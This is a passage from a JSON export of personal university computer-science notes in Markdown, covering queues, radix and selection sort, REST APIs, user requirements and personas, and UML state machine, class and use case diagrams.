    "content": "# Queue\n- First in, last out (**FIFO**), double linked [list](notes/general/lists.md) works well.\n    - Think of a standard queue, for example at the bank.\n    - The add and remove operations are called **enqueue** and **dequeue**.\n\nItems are inserted at one end (rear) and deleted at the other end (the front).\n\nWe use `ENQUEUE` for insertion and `DEQUEUE` for deletion.\n\n![Screenshot 2022-10-24 at 12.19.23](notes/images/Screenshot%202022-10-24%20at%2012.19.23.png)\n\n## Applications\n- Applications with a single resource that you are trying to share  \n- Printer queues  \n- Email message queues  \n- Processor queues",
    "lastmodified": "2022-11-24T12:21:04.081106067Z",
    "tags": null
  },
  "/notes/university/radix-sort": {
    "title": "Radix Sort",
    "content": "# Radix Sort\nIt is a non-comparison sorting method which only works on **binary** or **integer** data.\n\nIt takes $O(nb)$ time complexity, where:\n- $n$ is the number of items.\n- $b$ is the number of bits.\n- best, worse and average case.\n\nIt is **very fast**.\n\nIt works by using a binary bucked sort for each binary digit:\n\n1. Sort by the least significant bit.\n2. Split input into 2 sets (bucket) based on the bit, those that have a 0 and those that have a 1 (ordering of data must be maintained).\n3. Proceed to the next significant bit and repeat until we run out.\n\n![400](notes/images/Screenshot%202022-10-24%20at%2017.13.50.png)",
    "lastmodified": "2022-11-24T12:21:04.100135684Z",
    "tags": null
  },
  "/notes/university/rest-api": {
    "title": "REST API",
    "content": "# REST API\nAPIs provide a standardised way for two applications to send data back and forth. \n\nREST is a set of guidelines that software can use to communicate over the internet in order to make integrations simple and scalable.\n\nREST stands for **Representational State Transfer**, meaning that when a client requests a resource using a REST API, the server transfer back the current state of the resource in a standardised representation.\n\nFor example, my program can ask Youtube's REST API for information about a specific video, Youtube will respond to the request with the resource state, which includes attributes like the video name, publishing date, view count and video link - all packaged in a format that the receiving program can quickly parse and use. \n\n1. Client-Server Separation.\n2. Uniform Interface.\n3. Stateless.\n4. Layered System.\n5. Cacheable.\n6. Code on Demand (Optional).\n\n## Why use REST APIs?\n- They are flexible, scalable and they incorporate existing web technologies.",
    "lastmodified": "2022-11-24T12:21:04.116444588Z",
    "tags": null
  },
  "/notes/university/scrum": {
    "title": "Scrum",
    "content": "# Scrum",
    "lastmodified": "2022-11-24T12:21:04.2632128Z",
    "tags": null
  },
  "/notes/university/selection-sort": {
    "title": "Selection Sort",
    "content": "# Selection Sort\n---\nIt sorts an array by repeatedly finding the minimum element from the unsorted part of the array and puts it at the beginning.\n\n![Screenshot 2022-10-24 at 16.59.08](notes/images/Screenshot%202022-10-24%20at%2016.59.08.png)",
    "lastmodified": "2022-11-24T12:21:04.284150958Z",
    "tags": null
  },
  "/notes/university/specifying-user-requirements": {
    "title": "Specifying User Requirements",
    "content": "# Specifying User Requirements\n---\nSelecting an appropriate UCD (User Centred Design) method is **vital**.\n\n```toc\n```\n\n## Human-Centred Design Process: ISO 13407\n---\nIts goal is to achieve **usable** systems.\n\nIt is a standard, a framework for applying HCD and evaluation techniques.\n\nIt supplements existing lifecycle modes by specifying general activities to be performed in development, but it doesn't demand or recommend particular techniques or methods.\n\nIt defines one stage of UCD as the **specification of user and organisational requirements**.\n\nThis should:\n- **Identify** the range of relevant users and other personnel in the design.\n- Provide a clear statement of the HCD **goals**.\n- Set appropriate **priorities** for the different requirements.\n- Provide **measurable criteria** against which the emerging design can be tested.\n- Be adequately **documented**.\n\n## The Star Life Cycle\n---\nIt emphasises that ordering of activities is inappropriate.\n\nIt is evaluation centred and encourages iteration.\n\n![400](notes/images/Screenshot%202022-11-18%20at%2011.22.13.png)\n\n## User Requirements\n---\nDetermining user needs can be quite hard, because:\n- User rarely knows what is possible.\n- User may not know their needs, what they need to achieve their goals and interests.\n\nSpecifying a design is not just giving people what they ask for, again they don't really know what they want.\n\nIt is important to **define** user requirements as they determine what we are trying to create in the design process, especially early on.\n\nIt also supports defining **usability** requirements:\n- Useful in early design, but more critical at the evaluation stages.\n- Asks: how do you asses if your design is or will be successful?\n\n### Why gather requirements?\n---\nThey aren't usually a \"given\" factor:\n- They **aren't always what they initially appear to be**, or what designers are told that they are.\n- Stakeholders **conflicts** can arrive.\n    - Including **within the design/development** phase.\n\n### How to Identify Requirements\n---\n![600](notes/images/Screenshot%202022-11-18%20at%2011.28.41.png)\n\nYou need to identify:\n- What\n    - The things they use to do the work.\n- Who\n    - The people involved with the work.\n- Where\n    - Where the work is done.\n- When\n    - What time is the work done.\n- How\n    - The processes that involved in the work.\n- The information required to do the work.\n- The constraints imposed on the work.\n- The problems they face in the work.\n- The inputs required by the work.\n- The outputs created by the work.\n- Why\n    - They do they do they work, and in this way.\n\n#### Different Types of Requirements\nFunctional:\n- What a system is supposed **to do**.\n- Is it **necessary**? Is it **useful**?\n\nNon-functional:\n- How a system is supposed **to be**?\n- Often called **qualities** of a system.\n- **Criteria** that can be used to judge the operation of a system.\n- Your usability requirements should describe the context of use:\n    - Who, what, when, where, and why.\n\nUser Requirements:\n- Define how to meet users **physical and cognitive needs**.\n    - Who will be **using it**, in what environments (e.g. knowledge, roles, abilities).\n\nUsability Requirements:\n- Specifies a required amount of usability: a **measurable** quality, so an **engineering** target, for example around\n    - Efficiency: goals are easy/quick to accomplish, with few/no user errors.\n    - Intuitiveness: easy to learn and navigate, simple to understand.\n    - Low perceived workload: not intimidating, demanding or frustrating.\n\n## What is a \"right\" requirement?\n---\n1. Just in time, just enough detail.\n    - Can take a long time to do, **no more than is necessary**.\n2. Realistic.\n    - Don't expect too much.\n3. Clearly and unambiguously defined.\n4. Relevant\n    - Relevant to designers, relevant to the next cycle of the design process, helps solve a design problem/question.\n\n## Personas\n---\nThey are documents that **describe** typical **target users**.\n\nThey are a critical method for orienting design and development teams to **user experience**.\n\nA persona represents an aggregate of target users who **share common behavioural characteristics**, for example is a hypothetical archetype of real user.\n\nPerona perspectives: goal, role, engaging, fiction.\n\nMore info [here](https://www.interaction-design.org/literature/book/the-encyclopedia-of-human-computer-interaction-2nd-ed/personas).\n\n[Online persona generator](https://xtensio.com/user-persona-template/).\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.03.png)\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.19.png)\n\n![500](notes/images/Screenshot%202022-11-18%20at%2011.46.29.png)\n\n### Why?\n---\n- Requirements.\n- Visual design.\n- Quality assurance.\n\n### Using Personas\n---\n- Expectation.\n- Behaviour.\n- Context.\n- Feedback.\n\n### Issues with Personas\n---\n- They are **abstract**: hard to understand abstraction process from user data to persona, so personas come across as lacking critical detail.\n- They are **impersonal**, the personifying details in personas fail to provide a sense of empathy.\n- **Details mislead**, it is difficult to select personal details that do not create a false constraints on the design problem.\n- Personifying details **distract**, they make it hard to focus on the aspects of a persona that are critical for the design problem.\n\n### Benefits of Persona\n---\n- User insight.\n- Process of personification.\n- Constant reminders.\n- Personas vs Real People.\n\n### Minimum Persona\n---\n- Picture.\n- Name.\n- Age.\n- Location.\n- Occupation.\n- Bio-rich story that adds reality.\n\n### Optional Content\n---\n- Educational level.\n- Salary or range.\n- Personal motto.\n- Online activities.\n- Offline activities.\n- Trigger or touchpoint for service.\n- Technical comfort level.\n- Social comfort level.\n- Mobile comfort level.\n- Motivation to use service.\n- User goals.\n\n### Guerilla Personas\n---\nLimited money, limited time: empathy map.\n\n![400](notes/images/Screenshot%202022-11-18%20at%2011.47.24.png)",
    "lastmodified": "2022-11-24T12:21:04.297113776Z",
    "tags": null
  },
  "/notes/university/state-machine-diagrams-part1": {
    "title": "State Machine Diagrams - Part 1",
    "content": "# State Machine Diagrams (PART 1)\n---\n```toc\n```\n\n![Screenshot 2022-11-07 at 12.53.15](notes/images/Screenshot%202022-11-07%20at%2012.53.15.png)\n\n## Introduction\n---\nEvery object takes a finite number of different stages during its life. State machine diagrams are used as follows:\n- To model the possible **states** of a system or object.\n- To show how state **transitions** occur as a consequence of events.\n- To show what **behaviour** the system or object exhibits in each state.\n\nFor example: high-level description of the behaviour of a lecture hall:\n\n![Screenshot 2022-11-07 at 12.55.04](notes/images/Screenshot%202022-11-07%20at%2012.55.04.png)\n\nWhere occupy() and release() are the **transitions** and \"free = true\"/\"free = false\" are the **states**.\n\nAnother example would be a Digital Clock:\n![Screenshot 2022-11-07 at 12.56.27](notes/images/Screenshot%202022-11-07%20at%2012.56.27.png)\n\n## States\n---\nThey are nodes of the state machine:\n\n![200](notes/images/Screenshot%202022-11-07%20at%2012.56.59.png)\n\nWhen a state is active:\n- The object is in that state.\n- All internal activities specified in this state can be executed, meaning an activity can consist of multiple actions.\n\nentry/Activity(...)\n- Executed when the object enters the state.\n\nexit/Activity(...)\n- Executed when the object exits the state.\n\ndo/Activity(...)\n- Executed while the object remains in this state.\n\n![200](notes/images/Screenshot%202022-11-07%20at%2012.58.46.png)\n\n## Transitions\n---\n### Syntax\nChange from one state to another:\n\n![370](notes/images/Screenshot%202022-11-07%20at%2012.59.10.png)\n\n- Event (trigger)\n    - Exogenous (has an external cause or origin) stimulus.\n    - Can trigger a state transition.\n\n- Guard (condition)\n    - Boolean expression.\n    - If the event occurs, the guard is checked.\n    - If the guard is true:\n        - All activities in the current state are terminated.\n        - Any relevant exit activity is executed.\n        - The transition takes place.\n    - If the guard is false:\n        - No state transition takes place, the event is discarded.\n\n- Activity (effect)\n     - Sequence of actions executed during the state transition.\n\n### Types\n- Internal:\n\n![300](notes/images/Screenshot%202022-11-07%20at%2013.11.26.png)\n\n- External:\n\n![300](notes/images/Screenshot%202022-11-07%20at%2013.11.42.png)\n\n#### When do the following transitions take place?\n![Screenshot 2022-11-07 at 13.12.28](notes/images/Screenshot%202022-11-07%20at%2013.12.28.png)\n\n### Sequence of Activity Executions\nAssuming $S1$ is active, what is the value of $x$ after $e$ occurred?\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.15.10.png)\n\n- $S1$ becomes active, $x$ is set to the value 4.\n- $e$ occurs, the guard is checked and evaluates to true.\n- $S1$ is left, $x$ is set to 5.\n- The transition takes place, $x$ is set to 10.\n- $S2$ is entered, $x$ is set to 11.\n\nRegistration status of an exam example:\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.18.22.png)\n\n## Types of Events\n---\n### Signal Event\nReceipt of a sinal.\n- e.g.: `rightmousedown`, `sendSMS(message)`.\n\n### Call Event\nOperation call.\n-  e.g.: `occupy(user, lectureHall)`, `register(exam)`.\n\n### Time Event\nTime-based state transition:\n- Relative: based on the time of the occurrence of the event.\n    - e.g.: `after(5 seconds)`.\n- Absolute\n    - e.g.: `when(time==16:00)`, `when(data==20150101)`.\n\n### Any Receive Event\nOccurs when any event occurs that does not trigger another transition from the active state:\n- Keyword **all**.\n\n### Completion Event\nGenerated automatically when everything to be done in the current state is complete.\n\n### Change Event\nPermanently checking whether a condition becomes true.\n\nE.g.: `when(x \u003e y), after(90min)`.\n\n## Change Event vs Guard\n---\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.25.png)\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.36.png)\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.48.png)\n\n## Types of States\n---\n### Initial State\nIt is a **pseudo-state**, meaning it is transient (system cannot remain in that state). It is more of a control structure than a real state.\n\nNo incoming edges.\n\n- If \u003e 1 outgoing edges:\n    - Guards must be mutually exclusive and cover all possible cases to ensure that exactly one target state is reached.\n\n- If initial state becomes active, the object immediately switches to the next state.\n    - No events allowed on the outgoing edges (exception: `new()`).\n\n### Final State and Terminate Node\n- Final State\n    - Real state.\n    - Marks the end of the sequence of state.\n    - Object can remain in a final state forever.\n    - ![25](notes/images/Screenshot%202022-11-07%20at%2013.29.28.png)\n\n- Terminate Node\n    - Pseudo-state.\n    - Terminates the state machine.\n    - The modelled object ceases to exist (= is deleted).\n    - ![25](notes/images/Screenshot%202022-11-07%20at%2013.30.21.png)\n\n### Decision Node\nIt is a pseudo-state and is used to model alternative transitions.\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.30.54.png)\n\n#### Example\n![500](notes/images/Screenshot%202022-11-07%20at%2013.31.12.png)\n\n### Parallelisation and Synchronisation Node\n- Parallelisation node\n    - Pseudo-state.\n    - Splits the control flow into multiple concurrent flows.\n    - 1 incoming edge.\n    - \u003e 1 outgoing edges.\n    - ![70](notes/images/Screenshot%202022-11-07%20at%2013.32.09.png)\n\n- Synchronisation node\n    - Pseudo-state.\n    - Merges multiple concurrent flows.\n    - \u003e 1 incoming edges.\n    - 1 outgoing edge.\n    - ![70](notes/images/Screenshot%202022-11-07%20at%2013.32.50.png)\n\n## Summary\n---\n![Screenshot 2022-11-07 at 13.40.00](notes/images/Screenshot%202022-11-07%20at%2013.40.00.png)\n\n![Screenshot 2022-11-24 at 11.06.15](notes/images/Screenshot%202022-11-24%20at%2011.06.15.png)",
    "lastmodified": "2022-11-24T12:21:05.05460012Z",
    "tags": null
  },
  "/notes/university/state-machine-diagrams-part2": {
    "title": "State Machine Diagrams - Part 2",
    "content": "# State Machine Diagrams (PART 2)\n---\n```toc\n```\n\n## Recap: A Simple State\n---\n![Screenshot 2022-11-24 at 11.10.49](notes/images/Screenshot%202022-11-24%20at%2011.10.49.png)\n\n## Composite State\n---\nAlso known as **complex state** or **nested state**.\n\nIt contains other states, **substates**.\n- Only one of its substates is active at any point in time.\n\nArbitrary nesting depth of substates.\n\n![Screenshot 2022-11-24 at 11.12.25|600](notes/images/Screenshot%202022-11-24%20at%2011.12.25.png)\n\n### Entering a Composite State\n---\nTransition to the boundary, the initial node of the composite state is activated:\n\n| Event       | State   | Executed Activities |\n| ----------- | ------- | ------------------- |\n| „Beginning“ | S3      |                     |\n| e2          | S1/S1.1 | a0-a2-a3-a4         |\n\n![Screenshot 2022-11-24 at 11.14.11|600](notes/images/Screenshot%202022-11-24%20at%2011.14.11.png)\n\nTransition to a substate, substate is activated:\n\n| Event       | State   | Executed Activities |\n| ----------- | ------- | ------------------- |\n| „Beginning“ | S3      |                     |\n| e1          | S1/S1.2 | a0-a1-a3-a7         |\n\n![Screenshot 2022-11-24 at 11.24.11|600](notes/images/Screenshot%202022-11-24%20at%2011.24.11.png)\n\n### Exiting from a Composite State\n---\nTransition from a substate:\n\n| Event       | State   | Executed Activities |\n| ----------- | ------- | ------------------- |\n| „Beginning“ | S1/S1.1 | a3-a4               |\n| e3          | S2      | a6-a5-a2-a1         |\n\n![|600](notes/images/Screenshot%202022-11-24%20at%2013.06.41.png)\n\nTransition from the composite state:\n\nNote that no matter which substate of S1 is active, as soon as e5 occurs, the system changes to S2.\n\n| Event       | State   | Executed Activities |\n| ----------- | ------- | ------------------- |\n| „Beginning“ | S1/S1.1 | a3-a4               |\n| e5          | S2      | a6-a5-a3-a1         |\n\n![|600](notes/images/Screenshot%202022-11-24%20at%2013.09.20.png)\n\nCompletion transition from the composite state:\n\n| Event       | State   | Executed Activities |\n| ----------- | ------- | ------------------- |\n| „Beginning“ | S1/S1.1 | a3-a4               |\n| e4          | S1/S1.2 | a6-a7               |\n| e4          | S2      | a8-a5-a1            | \n\n![|600](notes/images/Screenshot%202022-11-24%20at%2013.11.15.png)\n\n## Parallelisation and Synchronisation Node\n---\n### Parallelisation node\n- Pseudostate.\n- Splits the control flow into multiple concurrent flows.\n- **1** incoming edge.\n- **\u003e1** outgoing edges.\n\n### Synchronisation node\n- Pseudostate.\n- Merges multiple concurrent flows.\n- **\u003e1** incoming edges.\n- **1** outgoing edge.\n\n![|500](notes/images/Screenshot%202022-11-24%20at%2013.13.59.png)\n\n## Orthogonal State\n---\nWhen a [Composite State](notes/university/state-machine-diagrams-part2.md#Composite%20State) is divided into two or more regions separated by a dashed line.",
    "lastmodified": "2022-11-24T13:18:38.780897856Z",
    "tags": null
  },
  "/notes/university/uml-class-diagram": {
    "title": "UML Class Diagram",
    "content": "# UML - Class Diagram\n\n```toc\n```\n---\n## Objects\nIndividuals of a system:\n\n![Screenshot 2022-10-21 at 13.10.25](notes/images/Screenshot%202022-10-21%20at%2013.10.25.png)\n\n### Object Diagram\nThe objects of a system and their relationships, snapshot of objects at a specific moment in time:\n\n![Screenshot 2022-10-21 at 13.11.07](notes/images/Screenshot%202022-10-21%20at%2013.11.07.png)\n\n## Classes\nA class is a **construction plan** for a set of similar object of a system.\n\nObject are **instances** of classes.\n\n- Attributes: structural characteristics of a class.\n- Operations: behaviour of a class.\n\n![300](notes/images/Screenshot%202022-10-21%20at%2013.12.30.png)\n\n![Screenshot 2022-10-21 at 13.12.54](notes/images/Screenshot%202022-10-21%20at%2013.12.54.png)\n\n### Attribute Syntax\n![Screenshot 2022-10-21 at 13.13.11](notes/images/Screenshot%202022-10-21%20at%2013.13.11.png)\n\n#### Visibility:\n   - `+`: public -\u003e everybody.\n   - `-`: private -\u003e only the object itself.\n   - `#`: protected -\u003e class itself and subclasses.\n   - `~`: package -\u003e classes that are in the same package.\n\n- `/`: attribute is derived from other attributes, for example `/age` as it is calculated from the date of birth.\n\n#### Type: \n   - User-defined classes.\n   - Data type:\n       - Primitive data type\n           - Pre-defined: Boolean, Integer, String.\n           - User-defined: `\u003c\u003cprimitive\u003e\u003e`\n           - Composite data type: `\u003c\u003cdatatype\u003e\u003e`\n       - Enumerations: `\u003c\u003cenumeration\u003e\u003e`\n\n#### Multiplicity:\n   - Number of values an attribute may contain.\n   - Default value: 1\n   - Notation `[min..max]`\n       - no upper limit: `[*]` or `[0..*]`\n\n![400](notes/images/Screenshot%202022-10-21%20at%2013.20.52.png)\n\n#### Properties\n- Pre-defined properties:\n    - `{readOnly}`: value cannot be changed.\n    - `{unique}`: no duplicates permitted.\n    - `{non-unique}`: duplicates permitted.\n    - `{ordered}`: fixed order of the values.\n    - `{unordered}`: no fixed order of the values.\n\n- Attribute specification:\n    - Set: `{unordered, unique}`\n    - Multi-set: `{unordered, non-unique}`\n    - Ordered set: `{ordered, unique}`\n    - List: `{ordered, non-unique}`\n\n#### Parameters\nSimilar to attributes.\n\n- Direction of the parameter:\n    - `in`: input parameter.\n    - `out`: output parameter.\n    - `inout`: combined.\n\n### Class Variable and Class Operations\n- Instance variable (instance attribute): attributes defined on instance level.\n- Class variable (class attribute):\n    - Defined only per class, shared by all instances of the class.\n    - For example: counters for the number of instances of a class, constants, etc.\n- Class operation:\n    - Can be used if no instance was created, for example: constructors, counting operations, math functions etc.\n\n![Screenshot 2022-10-21 at 13.27.01](notes/images/Screenshot%202022-10-21%20at%2013.27.01.png)\n\n## Specification of Classes: Different Levels of Detail\n![Screenshot 2022-10-21 at 13.27.38](notes/images/Screenshot%202022-10-21%20at%2013.27.38.png)\n\n## Association\nModels possible relationships between instances of classes.\n\n![Screenshot 2022-10-21 at 13.28.01](notes/images/Screenshot%202022-10-21%20at%2013.28.01.png)\n\n### Binary Association\nConnects two instances of two classes with one another.\n\n![Screenshot 2022-10-21 at 13.28.30](notes/images/Screenshot%202022-10-21%20at%2013.28.30.png)\n\n#### Navigability\nObject knows its partner objects and can therefore access their visible attributes and operations (open arrow head).\n\n#### Non-Navigability\nIndicated by a class, for example: `A` can access attributes and operations of `B` but `B` cannot access any attributes and operations of `A`.\n\n![200](notes/images/Screenshot%202022-10-21%20at%2013.30.17.png)\n\n![Screenshot 2022-10-21 at 13.30.34](notes/images/Screenshot%202022-10-21%20at%2013.30.34.png)\n\n#### Binary Association as Attribute\n![Screenshot 2022-10-21 at 13.31.06](notes/images/Screenshot%202022-10-21%20at%2013.31.06.png)\n\nIn Java:\n```java\nclass Professor()\n\nclass Student {\n    public Professor[] lecturer;\n    ...\n}\n```\n\n#### Multiplicity and role\n- Multiplicity: number of objects that may be associated with exactly one objet of the opposite side.\n\n![Screenshot 2022-10-21 at 13.32.02](notes/images/Screenshot%202022-10-21%20at%2013.32.02.png)\n\n- Role: the way in which an object is involved in an association relationship.\n\n![500](notes/images/Screenshot%202022-10-21%20at%2013.32.24.png)\n\n#### Xor Constraint\nAn object of class `A` is to be associated with an object of class `B` or an object of class `C` **but not with both**.\n\n![Screenshot 2022-10-21 at 13.33.17](notes/images/Screenshot%202022-10-21%20at%2013.33.17.png)\n\n## Unary Association - Example\n![Screenshot 2022-10-21 at 13.33.44](notes/images/Screenshot%202022-10-21%20at%2013.33.44.png)\n\n## n-ary Association\nMore than two partner objects are involved in the relationship.\n\nNo navigation directions.\n\n![Screenshot 2022-10-21 at 13.34.24](notes/images/Screenshot%202022-10-21%20at%2013.34.24.png)\n\n![Screenshot 2022-10-21 at 13.34.43](notes/images/Screenshot%202022-10-21%20at%2013.34.43.png)\n\n## Association Class\nAssign attributes to the relationship between classes rather than to a class itself.\n\n![Screenshot 2022-10-21 at 13.36.08](notes/images/Screenshot%202022-10-21%20at%2013.36.08.png)\n\nNecessary when modelling `n:m` Associations:\n\n![Screenshot 2022-10-21 at 13.36.37](notes/images/Screenshot%202022-10-21%20at%2013.36.37.png)\n\nWith `1:1` or `1:n` possible but not necessary:\n\n![Screenshot 2022-10-21 at 13.36.56](notes/images/Screenshot%202022-10-21%20at%2013.36.56.png)\n\n### Association Class vs Regular Class\n![Screenshot 2022-10-21 at 13.37.18](notes/images/Screenshot%202022-10-21%20at%2013.37.18.png)\n\n### Unique/Non-Unique\n![Screenshot 2022-10-21 at 13.37.41](notes/images/Screenshot%202022-10-21%20at%2013.37.41.png)\n\n## Aggregation\nSpecial form of association used to express that a class is part of another class.\n\nProperties of the aggregation association:\n- **Transitive**: if `B` is part of `A` and `C` is part of `B`, `C` is also part of `A`.\n- **Asymmetric**: it is not possible for `A` to be part of `B` and `B` to be part of `A` simultaneously.\n\nTwo types: **shared aggregation** and **composition**.\n\n### Shared Aggregation\n- Expresses a weak belonging of the parts to a whole, meaning they also exist independently of the whole.\n- Multiplicity at the aggregating end may be \u003e 1, meaning one element can be part of multiple other elements simultaneously.\n- Spans a **directed acyclic graph**.\n- Syntax: hollow diamond at the aggregating end.\n\nExample:\n- **Student** is part of **LabClass**\n- **Course** is part of **StudyProgram**\n\n![450](notes/images/Screenshot%202022-10-21%20at%2013.41.11.png)\n\n### Composition\n- Existence dependency between the composite object and its parts.\n- Multiplicity at the aggregating end max of 1, the composite objects form a tree.\n- If the composite object is deleted, **its parts are also deleted**.\n- Syntax: solid diamond at the aggregating end.\n\nExample:\n- **Beamer** is part of **LectureHall** is part of **Building**.\n\n![Screenshot 2022-10-21 at 13.42.53](notes/images/Screenshot%202022-10-21%20at%2013.42.53.png)\n\n## Generalisation\n- Characteristics (attributes and operations), associations, and aggregations that are specified for a general class (superclass) are passed on to its subclasses. \n- Every instance of a subclass is simultaneously an indirect instance of the superclass.  \n- Subclass inherits all characteristics, associations, and aggregations of the superclass except private ones.  \n- Subclass may have further characteristics, associations, and aggregations.  \n- Generalisations are transitive.\n\n![450](notes/images/Screenshot%202022-10-21%20at%2013.45.47.png)\n\n### Abstract Class\n- Used to highlight common characteristics of their subclasses.  \n- Used to ensure that there are no direct instances of the superclass.  \n- Only its non-abstract subclasses can be instantiated.  \n- Useful in the context of generalisation relationships.  \n- Notation: keyword `{abstract}` or class name in italic font.\n\n### Multiple Inheritance\n- UML allows multiple inheritance.\n- A class may have multiple superclasses.\n\nExample:\n![Screenshot 2022-10-21 at 13.46.52](notes/images/Screenshot%202022-10-21%20at%2013.46.52.png)\n\n### With vs Without Generalisation\n![Screenshot 2022-10-21 at 13.47.13](notes/images/Screenshot%202022-10-21%20at%2013.47.13.png)\n\n## Creating a Class Diagram\n- Not possible to completely extract classes, attributes and associations from a natural language text automatically.  \n- Guidelines:\n    - **Nouns** often indicate **classes**.\n    - **Adjectives** indicate attribute **values**.\n    - **Verbs** indicate **operations**.\n\n- Example: The library management system stores users with their unique ID, name and address as well as books with their title, author and ISBN number. \n\n![Screenshot 2022-10-21 at 13.48.48](notes/images/Screenshot%202022-10-21%20at%2013.48.48.png)\n\n## Notation\n| Name                             | Notation                                                | Description                                                                                         |\n| -------------------------------- | ------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |\n| Class                            | ![Screenshot 2022-10-21 at 13.51.48](notes/images/Screenshot%202022-10-21%20at%2013.51.48.png) | Description of the structure and behaviour of a set of objects.                                     |\n| Abstract Class                   | ![Screenshot 2022-10-21 at 13.54.37](notes/images/Screenshot%202022-10-21%20at%2013.54.37.png) | Class that cannot be instantiated.                                                                  |\n| Association                      | ![Screenshot 2022-10-21 at 13.55.00](notes/images/Screenshot%202022-10-21%20at%2013.55.00.png) | Relationship between classes where navigability is unspecified or bidirectional or one directional. |\n| n-ary Association                | ![Screenshot 2022-10-21 at 13.55.59](notes/images/Screenshot%202022-10-21%20at%2013.55.59.png) | Relationship between n (here 3) classes.                                                            |\n| Association Class                | ![Screenshot 2022-10-21 at 13.56.24](notes/images/Screenshot%202022-10-21%20at%2013.56.24.png) | More detailed description of an association.                                                        |\n| `xor` Relationship               | ![Screenshot 2022-10-21 at 13.56.47](notes/images/Screenshot%202022-10-21%20at%2013.56.47.png) | An object of `C` is in a relationship with `A` or with `B` but not both.                            |\n| Shared aggregation               | ![Screenshot 2022-10-21 at 13.57.45](notes/images/Screenshot%202022-10-21%20at%2013.57.45.png) | Parts-whole relationship (`A` is part of `B`)                                                       |\n| Strong aggregation (composition) | ![Screenshot 2022-10-21 at 13.58.08](notes/images/Screenshot%202022-10-21%20at%2013.58.08.png) | Existence-dependant parts-whole relationship (`A` is part of `B`)                                   |\n| Generalisation                   | ![Screenshot 2022-10-21 at 13.58.34](notes/images/Screenshot%202022-10-21%20at%2013.58.34.png) | Inheritance relationship (`A` inherits from `B`)                                                    |\n| Object                           | ![Screenshot 2022-10-21 at 13.58.54](notes/images/Screenshot%202022-10-21%20at%2013.58.54.png) | Instance of class.                                                                                  |\n| Link                             | ![Screenshot 2022-10-21 at 13.59.15](notes/images/Screenshot%202022-10-21%20at%2013.59.15.png) | Relationship between objects.                                                                                                    |\n",
    "lastmodified": "2022-11-24T12:21:04.437138438Z",
    "tags": null
  },
  "/notes/university/uml-classroom-chap3": {
    "title": "UML @ Classroom - Chapter 3",
    "content": "# UML @ Classroom - Chapter 3\n---\n## Use Case Diagram\n- Allows to describe the possible usage scenarios (use cases) that a system is developed for.\n- Doesn't address realisation details, for example data structures or algorithms.\n- Use case: what the customer wants the system to do, the requirements.\n\nWe can employ it to answer the following questions:\n\n1. What is being described? (The system)\n2. Who interacts with the system? (The actors)\n3. What can the actors do? (The use cases)\n\n### Use Cases\nDescribes the functionality expected from the system to be developed.\n\nIt is triggered either by invocation of an actor or by a **trigger event**. They are determined by collecting customer wishes and analysing problems. They can also be used to document the functionality that a system offers.\n\n![Screenshot 2022-10-03 at 15.41.51](notes/images/Screenshot%202022-10-03%20at%2015.41.51.png)\n\nThe rectangle symbolises the boundaries of the system to be described:\n\n![Screenshot 2022-10-03 at 15.42.24](notes/images/Screenshot%202022-10-03%20at%2015.42.24.png)\n\n### Actors\nWho works and interacts with the system.\n\nThey can be human or non-human.\n\n- Active actor: initiates the execution of use cases.\n- Passive actor: is used by the system.\n\nIn the example below Professor is an **active** actor while the E-mail Server is **passive**.\n\n- Primary actor: takes an actual benefit from the execution of the use case (the Professor).\n- Secondary actor: receives no direct benefit from the execution of the use case. It **does not** need to be necessarily passive.\n\nAs you can see, both Professor and Student are actively involved in the execution of the use case Exam, the main beneficiary being the Student. Professor has a lower benefit from the exam but is necessary for the execution of the use case.\n\n![Screenshot 2022-10-03 at 15.46.30](notes/images/Screenshot%202022-10-03%20at%2015.46.30.png)\n\nActors are **always** outside the system.\n\n### Associations\nExpresses that the actor communicates with the system and uses a certain functionality.\n\nEvery actor must communicate with at least one use case and vice-versa.\n\nAssociations are always binary, meaning that it is always specified between one use case and one actor.\n\n- Multiplicity:\n\n![Screenshot 2022-10-03 at 15.48.24](notes/images/Screenshot%202022-10-03%20at%2015.48.24.png)\n\nActors represent **roles**.\n\n### Relationships between Actors\nActors can have common properties. For example, not only professors but assistants are permitted to view student data. To handle this, we use an **inheritance relationship** (generalisation).\n\nWhen actor Y (sub-actor) inherits from actor X (super-actor), Y is involved with all use cases with which X is involved.\n\nIn the image below the actors Professor and Assistant inherit from the actor Research Associate, meaning every professor and every assistant is a research associate. Every research associate can Query student data, but only professors can create a new course and tasks can only be published by assistants. To execute Issue certificate, we need a professor but an assistant can be involved optionally (0..1).\n\n![Screenshot 2022-10-03 at 15.52.06](notes/images/Screenshot%202022-10-03%20at%2015.52.06.png)\n\nTwo actors participating in a use case vs two actors having a common super-actor that participates in the use case:\n\n![Screenshot 2022-10-03 at 15.53.02](notes/images/Screenshot%202022-10-03%20at%2015.53.02.png)\n\n- **Abstract**: if there is no instance of an actor.\n\n### Relationships between Use Cases\n![Screenshot 2022-10-03 at 15.58.12](notes/images/Screenshot%202022-10-03%20at%2015.58.12.png)\n\n#### Include\nThe behaviour of the included use case (B) is integrated into the behaviour of the base use case (A). The included use case can be executed on its own. It is analogous to **calling a subroutine**.\n\n![Screenshot 2022-10-03 at 15.58.20](notes/images/Screenshot%202022-10-03%20at%2015.58.20.png)\n\nIn the example, Announce lecture is the **base use case** - meaning when a new lecture is announced, the use case Assign lecturer must also be executed. The actor Professor is involved in the execution of **both** use cases.\n\nPoints from the base.\n\n#### Extend\nIf a use case B is in an `\u003c\u003cextend\u003e\u003e` relationship with a use case A (base use case), then A can use the behaviour of B (extending use case) but does not have to. B can be activated by A in order to insert the behaviour of B in A.\n\nBoth use cases can be executed independently of one another.\n\n![Screenshot 2022-10-03 at 16.00.27](notes/images/Screenshot%202022-10-03%20at%2016.00.27.png)\n\nFor example, when a new lecture is announced, it is possible (not mandatory) to reserve a lecture hall. \n\nA use case can act as an extending use case several times or can itself be extended by several use cases.\n\nPoints towards the base.\n\n#### Condition\nExtending relationships can have conditions, which must be fulfilled for the base use case to insert the behaviour of the extending use case.\n\n![Screenshot 2022-10-03 at 